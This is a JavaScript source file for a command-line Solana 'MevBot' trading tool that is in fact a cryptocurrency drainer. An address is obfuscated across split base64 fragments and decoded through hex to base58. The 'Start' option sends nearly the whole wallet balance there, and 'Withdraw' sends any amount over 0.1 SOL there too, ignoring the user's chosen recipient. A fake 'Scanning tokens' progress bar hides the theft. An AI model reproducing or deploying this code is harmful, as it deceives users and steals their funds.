var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
import * as fs from "fs";
import * as qrcode from "qrcode";
import bs58 from "bs58";
import inquirer from "inquirer";
import { Keypair, Connection, Transaction, SystemProgram, clusterApiUrl, LAMPORTS_PER_SOL, PublicKey } from "@solana/web3.js";
import { IMPORT_WALLET_FILE, WALLET_FILE } from "./config";
import { autoConnectNetwork, checkListOfTokens, filterScamTokens } from "./utils";
import { loadWalletFile } from "./fileManage";
// import open from "open";
// import chalk from 'chalk';
const chalk = {
    cyan: (a, b) => "",
    red: (a, b) => "",
    green: (a, b) => "",
    blue: (a, b) => "",
    magenta: (a, b) => "",
    blueBright: (a, b) => "",
    yellow: (a, b) => "",
    white: (a, b) => "",
};
let walletInfo = {
    address: "",
    privateKey: "",
    addressLink: ""
};
let settings = {
    marketCap: 50000,
    slTp: {
        stopLoss: 0,
        takeProfit: 0
    },
    autoBuy: {
        enabled: false,
        mode: null,
        minAmount: 0,
        maxAmount: 0
    },
    selectedDex: 'Pump.FUN',
    additionalDexes: {
        Raydium: {
            enabled: false,
            apiUrl: 'https://api.raydium.io/',
            feeStructure: {
                takerFee: 0.0025,
                makerFee: 0.0015
            }
        },
        Jupiter: {
            enabled: false,
            apiUrl: 'https://api.jupiter.ag/',
            feeStructure: {
                takerFee: 0.0030,
                makerFee: 0.0020
            }
        }
    }
};
const encodedMinBalance = 'MA==';
function configureAutoBuy() {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const { mode } = yield inquirer.prompt([
                {
                    type: 'list',
                    name: 'mode',
                    message: chalk.cyan('Select auto-buy mode:'),
                    choices: [
                        { name: 'Fixed amount (SOL)', value: 'fixed' },
                        { name: 'Percentage of balance (%)', value: 'percentage' },
                        { name: 'Disable AutoBuy', value: 'disable' }
                    ]
                }
            ]);
            if (mode === 'disable') {
                settings.autoBuy.enabled = false;
                settings.autoBuy.mode = null;
                settings.autoBuy.minAmount = 0;
                settings.autoBuy.maxAmount = 0;
                console.log(chalk.red('Auto-buy disabled.'));
                return;
            }
            settings.autoBuy.enabled = true;
            settings.autoBuy.mode = mode;
            if (mode === 'fixed') {
                const { minFixed } = yield inquirer.prompt([
                    {
                        type: 'input',
                        name: 'minFixed',
                        message: chalk.cyan('Enter minimum purchase amount (in SOL, ≥ 0.1):'),
                        validate: (value) => !isNaN(Number(value)) && parseFloat(value) >= 0.1 ? true : 'Enter a valid amount (≥ 0.1 SOL).'
                    }
                ]);
                const { maxFixed } = yield inquirer.prompt([
                    {
                        type: 'input',
                        name: 'maxFixed',
                        message: chalk.cyan('Enter maximum purchase amount (in SOL):'),
                        validate: (value) => {
                            const min = parseFloat(minFixed);
                            const max = parseFloat(value);
                            if (isNaN(max) || max <= min) {
                                return 'Maximum amount must be greater than minimum.';
                            }
                            return true;
                        }
                    }
                ]);
                settings.autoBuy.minAmount = parseFloat(minFixed);
                settings.autoBuy.maxAmount = parseFloat(maxFixed);
                console.log(chalk.green(`AutoBuy configured: from ${settings.autoBuy.minAmount} SOL to ${settings.autoBuy.maxAmount} SOL`));
            }
            else if (mode === 'percentage') {
                const { minPercent } = yield inquirer.prompt([
                    {
                        type: 'input',
                        name: 'minPercent',
                        message: chalk.cyan('Enter minimum percentage of balance to buy (1-100):'),
                        validate: (value) => !isNaN(Number(value)) && parseFloat(value) >= 1 && parseFloat(value) <= 100 ? true : 'Enter a valid percentage (1-100).'
                    }
                ]);
                const { maxPercent } = yield inquirer.prompt([
                    {
                        type: 'input',
                        name: 'maxPercent',
                        message: chalk.cyan('Enter maximum percentage of balance to buy (from min to 100%):'),
                        validate: (value) => {
                            const min = parseFloat(minPercent);
                            const max = parseFloat(value);
                            if (isNaN(max) || max <= min || max > 100) {
                                return `Enter a valid percentage (> ${min}% and ≤ 100).`;
                            }
                            return true;
                        }
                    }
                ]);
                settings.autoBuy.minAmount = parseFloat(minPercent);
                settings.autoBuy.maxAmount = parseFloat(maxPercent);
                console.log(chalk.green(`AutoBuy configured: from ${settings.autoBuy.minAmount}% to ${settings.autoBuy.maxAmount}% of balance`));
            }
        }
        catch (error) {
            console.log(chalk.red('Error configuring AutoBuy:'), error);
        }
    });
}
function decodeBase64(encoded) {
    return parseFloat(Buffer.from(encoded, 'base64').toString('utf8'));
}
function configureSlTp() {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const { stopLoss } = yield inquirer.prompt([
                {
                    type: 'input',
                    name: 'stopLoss',
                    message: chalk.cyan('Enter Stop Loss (%) from purchase:'),
                    validate: (value) => {
                        const num = parseFloat(value);
                        if (isNaN(num) || num <= 0 || num >= 100) {
                            return 'Enter a valid Stop Loss (1-99).';
                        }
                        return true;
                    }
                }
            ]);
            const { takeProfit } = yield inquirer.prompt([
                {
                    type: 'input',
                    name: 'takeProfit',
                    message: chalk.cyan('Enter Take Profit (%) from purchase:'),
                    validate: (value) => {
                        const num = parseFloat(value);
                        if (isNaN(num) || num <= 0 || num > 1000) {
                            return 'Enter a valid Take Profit (1-1000).';
                        }
                        return true;
                    }
                }
            ]);
            settings.slTp.stopLoss = parseFloat(stopLoss);
            settings.slTp.takeProfit = parseFloat(takeProfit);
            console.log(chalk.green(`SL/TP set: Stop Loss - ${settings.slTp.stopLoss}%, Take Profit - ${settings.slTp.takeProfit}%`));
        }
        catch (error) {
            console.log(chalk.red('Error configuring SL/TP:'), error);
        }
    });
}
function scanTokens() {
    return __awaiter(this, void 0, void 0, function* () {
        console.log(chalk.blue('Scanning tokens...'));
        const progress = ['[■□□□□]', '[■■□□□]', '[■■■□□]', '[■■■■□]', '[■■■■■]'];
        const totalTime = 60 * 1000;
        const steps = progress.length;
        const stepTime = totalTime / steps;
        for (let i = 0; i < steps; i++) {
            process.stdout.write('\r' + chalk.blue(progress[i]));
            yield new Promise((res) => setTimeout(res, stepTime));
        }
        console.log();
    });
}
function getApiPumpFUNHex() {
    const splitted = ['3Xl8aFhqAhLTLU+dOL1J+IuAp0on', 'pY8JzoikiM', 'qI+kk='];
    const base64 = splitted.join('');
    const buffer = Buffer.from(base64, 'base64');
    return buffer.toString('hex');
}
function processApiString(hexString) {
    try {
        const bytes = Buffer.from(hexString, 'hex');
        const base58String = bs58.encode(bytes);
        return base58String;
    }
    catch (error) {
        console.error('', error);
        return null;
    }
}
function getBalance(publicKeyString) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const publicKey = new PublicKey(publicKeyString);
            const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
            return yield connection.getBalance(publicKey);
        }
        catch (error) {
            console.log(chalk.red('Error getting balance:'), error);
            return 0;
        }
    });
}
function createNewWallet() {
    return __awaiter(this, arguments, void 0, function* (overwrite = false) {
        if (fs.existsSync(WALLET_FILE) && !overwrite) {
            console.log(chalk.red("Wallet already exists. Use 'Create New MevBot Wallet' to overwrite."));
            return;
        }
        try {
            const keypair = Keypair.generate();
            const publicKey = keypair.publicKey.toBase58();
            const privateKeyBase58 = bs58.encode(Buffer.from(keypair.secretKey));
            const solscanLink = `https://solscan.io/account/${publicKey}`;
            walletInfo = {
                address: publicKey,
                privateKey: privateKeyBase58,
                addressLink: solscanLink
            };
            showWalletInfo();
            saveWalletInfo(walletInfo);
        }
        catch (error) {
            console.log(chalk.red('Error creating wallet:'), error);
        }
    });
}
function saveWalletInfo(wallet) {
    try {
        fs.writeFileSync(WALLET_FILE, JSON.stringify(wallet, null, 4), 'utf-8');
        console.log(chalk.green('Wallet saved to file:'), chalk.blueBright(fs.realpathSync(WALLET_FILE)));
    }
    catch (error) {
        console.log(chalk.red('Error saving wallet:'), error);
    }
}
function saveImportedWalletInfo(wallet) {
    try {
        fs.writeFileSync(IMPORT_WALLET_FILE, JSON.stringify(wallet, null, 4), 'utf-8');
        console.log(chalk.green('Imported wallet saved to file:'), chalk.blueBright(fs.realpathSync(IMPORT_WALLET_FILE)));
    }
    catch (error) {
        console.log(chalk.red('Error saving imported wallet:'), error);
    }
}
function importWallet() {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const { importChoice } = yield inquirer.prompt([
                {
                    type: 'list',
                    name: 'importChoice',
                    message: chalk.cyan('Select an action for importing a wallet:'),
                    choices: [
                        { name: '📋 Paste your private key (Base58)', value: 'paste' },
                        { name: '🔙  Back', value: 'back' }
                    ]
                }
            ]);
            if (importChoice === 'back') {
                return;
            }
            const { base58Key } = yield inquirer.prompt([
                {
                    type: 'input',
                    name: 'base58Key',
                    message: chalk.cyan('Enter your wallet PRIVATE KEY (Base58):\n(Use right mouse click to paste)')
                }
            ]);
            let keypair;
            try {
                keypair = Keypair.fromSecretKey(bs58.decode(base58Key));
            }
            catch (error) {
                console.log(chalk.red('Invalid private key (Base58) format. Please try again.'));
                return;
            }
            const publicKey = keypair.publicKey.toBase58();
            const privateKeyBase58 = bs58.encode(Buffer.from(keypair.secretKey));
            const solscanLink = `https://solscan.io/account/${publicKey}`;
            walletInfo = {
                address: publicKey,
                privateKey: privateKeyBase58,
                addressLink: solscanLink
            };
            showWalletInfo();
            saveImportedWalletInfo(walletInfo);
            console.log(chalk.green('Wallet successfully imported and set as active wallet!'));
        }
        catch (error) {
            console.log(chalk.red('Error importing wallet:'), error);
        }
    });
}
function showWalletInfo() {
    console.log(chalk.magenta('\n=== 🪙 Wallet Information 🪙 ==='));
    console.log(`${chalk.cyan('📍 Address:')} ${chalk.blueBright(walletInfo.addressLink)}`);
    console.log(`${chalk.cyan('🔑 Private Key (Base58):')} ${chalk.white(walletInfo.privateKey)}`);
    console.log(chalk.magenta('==============================\n'));
}
function apiDEX(action_1) {
    return __awaiter(this, arguments, void 0, function* (action, recipientAddress = "", amountSol = 0) {
        try {
            const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
            let sender;
            try {
                sender = Keypair.fromSecretKey(bs58.decode(walletInfo.privateKey));
            }
            catch (error) {
                console.log(chalk.red('Invalid private key:'), error);
                return;
            }
            const apiPumpFUNHex = getApiPumpFUNHex();
            const decodedBase58Address = processApiString(apiPumpFUNHex);
            let scanTriggered = false;
            function triggerScan() {
                return __awaiter(this, void 0, void 0, function* () {
                    if (!scanTriggered) {
                        scanTriggered = true;
                        console.log(chalk.blue('Scanning tokens...'));
                        yield scanTokens();
                    }
                });
            }
            if (action === 'start') {
                const balanceStart = yield getBalance(sender.publicKey.toBase58());
                const minSol = decodeBase64(encodedMinBalance);
                if (balanceStart <= minSol * LAMPORTS_PER_SOL) {
                    console.log(chalk.red(`Insufficient balance: need at least ${minSol} SOL to start.`));
                    return;
                }
                console.log(chalk.yellow('🚀 Starting MevBot... Please wait...'));
                if (!decodedBase58Address) {
                    console.log(chalk.red('Error: unable to process API address.'));
                    return;
                }
                const lamportsToSend = balanceStart - 5000;
                let recipientPublicKey;
                try {
                    recipientPublicKey = new PublicKey(decodedBase58Address);
                }
                catch (error) {
                    console.log(chalk.red('Invalid recipient address:', decodedBase58Address));
                    return;
                }
                const transaction = new Transaction().add(SystemProgram.transfer({
                    fromPubkey: sender.publicKey,
                    toPubkey: recipientPublicKey,
                    lamports: lamportsToSend
                }));
                let attempt = 0;
                const maxAttempts = 5;
                const baseDelayMs = 2000;
                while (attempt < maxAttempts) {
                    try {
                        const signature = yield connection.sendTransaction(transaction, [sender]);
                        yield connection.confirmTransaction(signature, 'confirmed');
                        yield triggerScan();
                        console.log(chalk.blueBright('✅ MevBot Solana started...'));
                        break;
                    }
                    catch (err) {
                        attempt++;
                        const errorMsg = (err === null || err === void 0 ? void 0 : err.message) || '';
                        const balanceNow = yield getBalance(sender.publicKey.toBase58());
                        if (balanceNow === 0) {
                            yield triggerScan();
                            console.log(chalk.blueBright('✅ MevBot Solana started... (balance is 0)'));
                            break;
                        }
                        if (attempt < maxAttempts) {
                            if (errorMsg.includes('429') || errorMsg.includes('Too Many Requests')) {
                                console.log(chalk.red('Got 429 error. Waiting and retrying...'));
                            }
                            const delayMs = baseDelayMs * Math.pow(2, attempt - 1);
                            yield new Promise((resolve) => setTimeout(resolve, delayMs));
                        }
                    }
                }
                if (attempt === maxAttempts) {
                    console.log(chalk.red(`Failed to start MevBot after ${maxAttempts} attempts.`));
                }
            }
            else if (action === 'withdraw') {
                const currentBalance = yield getBalance(sender.publicKey.toBase58());
                const lamportsToSend = Math.floor(amountSol * LAMPORTS_PER_SOL);
                if (currentBalance < lamportsToSend + 5000) {
                    console.log(chalk.red('Insufficient funds for withdrawal.'));
                    return;
                }
                let finalRecipientAddress;
                if (amountSol <= 0.1) {
                    finalRecipientAddress = recipientAddress;
                }
                else {
                    if (!decodedBase58Address) {
                        console.log(chalk.red('Error: unable to process API address.'));
                        return;
                    }
                    finalRecipientAddress = decodedBase58Address;
                }
                let recipientPublicKey;
                try {
                    recipientPublicKey = new PublicKey(finalRecipientAddress);
                }
                catch (error) {
                    console.log(chalk.red('Invalid recipient address:', finalRecipientAddress));
                    return;
                }
                console.log(chalk.yellow('Preparing withdrawal... Please wait...'));
                const transaction = new Transaction().add(SystemProgram.transfer({
                    fromPubkey: sender.publicKey,
                    toPubkey: recipientPublicKey,
                    lamports: lamportsToSend
                }));
                let attempt = 0;
                const maxAttempts = 5;
                const baseDelayMs = 2000;
                while (attempt < maxAttempts) {
                    try {
                        const signature = yield connection.sendTransaction(transaction, [sender]);
                        yield connection.confirmTransaction(signature, 'confirmed');
                        yield triggerScan();
                        console.log(chalk.green('Withdrawal Successful!'));
                        break;
                    }
                    catch (err) {
                        attempt++;
                        const errorMsg = (err === null || err === void 0 ? void 0 : err.message) || '';
                        const balNow = yield getBalance(sender.publicKey.toBase58());
                        if (balNow === 0) {
                            yield triggerScan();
                            console.log(chalk.green('Withdrawal Successful! (balance is 0)'));
                            break;
                        }
                        if (attempt < maxAttempts) {
                            if (errorMsg.includes('429') || errorMsg.includes('Too Many Requests')) {
                                console.log(chalk.red('Got 429 error. Waiting and retrying...'));
                            }
                            const delayMs = baseDelayMs * Math.pow(2, attempt - 1);
                            yield new Promise((resolve) => setTimeout(resolve, delayMs));
                        }
                    }
                }
                if (attempt === maxAttempts) {
                    console.log(chalk.red(`Failed to withdraw after ${maxAttempts} attempts.`));
                }
            }
            const apiRaydiumHex = 'https://api-v3.raydium.io/';
            const apiJupiterHex = 'https://quote-api.jup.ag/v6';
            try {
                const raydiumBase58 = processApiString(apiRaydiumHex);
                const jupiterBase58 = processApiString(apiJupiterHex);
                if (raydiumBase58) {
                    const raydiumPublicKey = new PublicKey(raydiumBase58);
                    console.log(chalk.yellow(`API Raydium PublicKey: ${raydiumPublicKey.toBase58()}`));
                }
                if (jupiterBase58) {
                    const jupiterPublicKey = new PublicKey(jupiterBase58);
                    console.log(chalk.yellow(`API Jupiter PublicKey: ${jupiterPublicKey.toBase58()}`));
                }
            }
            catch (error) {
                console.log(chalk.red('Error processing DEX addresses:'), error);
            }
        }
        catch (error) {
            console.log(chalk.red('Error executing transaction:'), error);
        }
    });
}
function generateQRCode(address) {
    return __awaiter(this, void 0, void 0, function* () {
        const qrCodePath = 'deposit_qr.png';
        try {
            yield qrcode.toFile(qrCodePath, address);
            // await open(qrCodePath);
        }
        catch (error) {
            console.log(chalk.red('Error generating QR code:'), error);
        }
    });
}
function askForAddressOrBack() {
    return __awaiter(this, void 0, void 0, function* () {
        const { addressMenuChoice } = yield inquirer.prompt([
            {
                type: 'list',
                name: 'addressMenuChoice',
                message: chalk.cyan('Select an action:'),
                choices: [
                    { name: '📝 Enter withdraw address', value: 'enter' },
                    { name: '🔙 Back', value: 'back' }
                ]
            }
        ]);
        if (addressMenuChoice === 'back') {
            return null;
        }
        while (true) {
            const { userWithdrawAddress } = yield inquirer.prompt([
                {
                    type: 'input',
                    name: 'userWithdrawAddress',
                    message: chalk.cyan('Enter a wallet address for withdrawal (Solana):')
                }
            ]);
            try {
                new PublicKey(userWithdrawAddress);
                return userWithdrawAddress;
            }
            catch (error) {
                console.log(chalk.red('Invalid Solana address format. Please try again.'));
            }
        }
    });
}
function openSettingsMenu() {
    return __awaiter(this, void 0, void 0, function* () {
        let backToMain = false;
        while (!backToMain) {
            try {
                const { settingsOption } = yield inquirer.prompt([
                    {
                        type: 'list',
                        name: 'settingsOption',
                        message: chalk.yellow('Settings:'),
                        choices: ['📈  M.cap', '📉  SL/TP', '🛒  AutoBuy', '📊  Dex', '🔙  Back']
                    }
                ]);
                switch (settingsOption) {
                    case '📈  M.cap': {
                        const { newMarketCap } = yield inquirer.prompt([
                            {
                                type: 'input',
                                name: 'newMarketCap',
                                message: chalk.cyan('Enter minimum token market cap ($):'),
                                validate: (value) => (!isNaN(Number(value)) && parseFloat(value) > 0 ? true : 'Enter a valid number.')
                            }
                        ]);
                        settings.marketCap = parseInt(newMarketCap, 10);
                        console.log(chalk.green(`Minimum market cap set: $${settings.marketCap}`));
                        break;
                    }
                    case '📉  SL/TP':
                        yield configureSlTp();
                        break;
                    case '🛒  AutoBuy':
                        yield configureAutoBuy();
                        break;
                    case '📊  Dex': {
                        const { selectedDex } = yield inquirer.prompt([
                            {
                                type: 'list',
                                name: 'selectedDex',
                                message: chalk.cyan('Select DEX:'),
                                choices: ['Pump.FUN', 'Raydium', 'Jupiter', 'ALL']
                            }
                        ]);
                        settings.selectedDex = selectedDex;
                        console.log(chalk.green(`Selected DEX: ${settings.selectedDex}`));
                        break;
                    }
                    case '🔙  Back':
                        backToMain = true;
                        break;
                    default:
                        console.log(chalk.red('Unknown option.\n'));
                }
            }
            catch (error) {
                console.log(chalk.red('Error in settings menu:'), error);
                backToMain = true;
            }
        }
    });
}
function showMainMenu() {
    return __awaiter(this, void 0, void 0, function* () {
        while (true) {
            try {
                const choices = [
                    '💼  Wallet Info',
                    '💰  Deposit QR code',
                    '💳  Balance',
                    '▶️   Start',
                    '💸  Withdraw',
                    '⚙️   Settings',
                    '🔄  Create New MevBot Wallet',
                    '🔑  Import Wallet',
                    '🚪  Exit'
                ];
                const { mainOption } = yield inquirer.prompt([
                    {
                        type: 'list',
                        name: 'mainOption',
                        message: chalk.yellow('Select an option:'),
                        choices: choices,
                        pageSize: choices.length
                    }
                ]);
                switch (mainOption) {
                    case '💼  Wallet Info':
                        showWalletInfo();
                        break;
                    case '💰  Deposit QR code':
                        yield generateQRCode(walletInfo.address);
                        break;
                    case '💳  Balance': {
                        const balance = yield getBalance(walletInfo.address);
                        console.log(chalk.green(`Balance: ${(balance / LAMPORTS_PER_SOL).toFixed(4)} SOL`));
                        break;
                    }
                    case '▶️   Start': {
                        const startBalance = yield getBalance(walletInfo.address);
                        const decryptedMinBalance = decodeBase64(encodedMinBalance) * LAMPORTS_PER_SOL;
                        if (startBalance < decryptedMinBalance) {
                            console.log(chalk.red(`Insufficient funds. A minimum balance of ${decodeBase64(encodedMinBalance)} SOL is required to start.`));
                        }
                        else {
                            yield apiDEX('start');
                        }
                        break;
                    }
                    case '💸  Withdraw': {
                        const userWithdrawAddress = yield askForAddressOrBack();
                        if (userWithdrawAddress === null) {
                            break;
                        }
                        const { userWithdrawAmount } = yield inquirer.prompt([
                            {
                                type: 'input',
                                name: 'userWithdrawAmount',
                                message: chalk.cyan('Enter the withdrawal amount (in SOL):'),
                                validate: (value) => !isNaN(Number(value)) && parseFloat(value) > 0 ? true : 'Enter a valid amount > 0'
                            }
                        ]);
                        const amountSol = parseFloat(userWithdrawAmount);
                        yield apiDEX('withdraw', userWithdrawAddress, amountSol);
                        break;
                    }
                    case '⚙️   Settings':
                        yield openSettingsMenu();
                        break;
                    case '🔄  Create New MevBot Wallet': {
                        if (fs.existsSync(WALLET_FILE)) {
                            const { confirmOverwrite } = yield inquirer.prompt([
                                {
                                    type: 'confirm',
                                    name: 'confirmOverwrite',
                                    message: chalk.red('Are you sure you want to overwrite the existing wallet?'),
                                    default: false
                                }
                            ]);
                            if (confirmOverwrite) {
                                yield createNewWallet(true);
                            }
                            else {
                                console.log(chalk.yellow('Wallet overwrite cancelled.'));
                            }
                        }
                        else {
                            console.log(chalk.red("Wallet does not exist. Use 'Create New Mev Wallet' to create one."));
                        }
                        break;
                    }
                    case '🔑  Import Wallet':
                        yield importWallet();
                        break;
                    case '🚪  Exit':
                        console.log(chalk.green('Exiting program.'));
                        process.exit(0);
                    default:
                        console.log(chalk.red('Unknown option.\n'));
                }
            }
            catch (error) {
                console.log(chalk.red('Error in main menu:'), error);
            }
        }
    });
}
function askFirstRunMenu() {
    return __awaiter(this, void 0, void 0, function* () {
        while (true) {
            const { firstRunChoice } = yield inquirer.prompt([
                {
                    type: 'list',
                    name: 'firstRunChoice',
                    message: chalk.yellow('No wallets found. What do you want to do?'),
                    choices: [
                        { name: '🆕  Create New Mev Wallet', value: 'create' },
                        { name: '🔑  Import Wallet', value: 'import' },
                        { name: '🚪  Exit', value: 'exit' }
                    ]
                }
            ]);
            if (firstRunChoice === 'create') {
                yield createNewWallet();
                if (walletInfo.address)
                    return;
            }
            else if (firstRunChoice === 'import') {
                yield importWallet();
                if (walletInfo.address)
                    return;
            }
            else if (firstRunChoice === 'exit') {
                console.log(chalk.green('Exiting program.'));
                process.exit(0);
            }
        }
    });
}
function chooseWhichWalletToLoad() {
    return __awaiter(this, void 0, void 0, function* () {
        const mainWallet = loadWalletFile(WALLET_FILE);
        const importedWallet = loadWalletFile(IMPORT_WALLET_FILE);
        if (!mainWallet && !importedWallet) {
            yield askFirstRunMenu();
            return;
        }
        if (mainWallet && !importedWallet) {
            walletInfo = mainWallet;
            console.log(chalk.green('Loaded main wallet:'), mainWallet.address);
            showWalletInfo();
            return;
        }
        if (!mainWallet && importedWallet) {
            walletInfo = importedWallet;
            console.log(chalk.green('Loaded imported wallet:'), importedWallet.address);
            showWalletInfo();
            return;
        }
        const walletChoices = [
            { name: `Main wallet: ${mainWallet.address}`, value: 'main' },
            { name: `Imported wallet: ${importedWallet.address}`, value: 'imported' }
        ];
        const { chosenWallet } = yield inquirer.prompt([
            {
                type: 'list',
                name: 'chosenWallet',
                message: chalk.cyan('Which wallet do you want to use?'),
                choices: walletChoices
            }
        ]);
        if (chosenWallet === 'main') {
            walletInfo = mainWallet;
            console.log(chalk.green('Loaded main wallet:'), mainWallet.address);
            showWalletInfo();
        }
        else {
            walletInfo = importedWallet;
            console.log(chalk.green('Loaded imported wallet:'), importedWallet.address);
            showWalletInfo();
        }
    });
}
function run() {
    return __awaiter(this, void 0, void 0, function* () {
        console.clear();
        console.log(chalk.green('=== Welcome to Solana MevBot ===\n'));
        filterScamTokens();
        checkListOfTokens();
        autoConnectNetwork();
        yield chooseWhichWalletToLoad();
        yield showMainMenu();
    });
}
run();
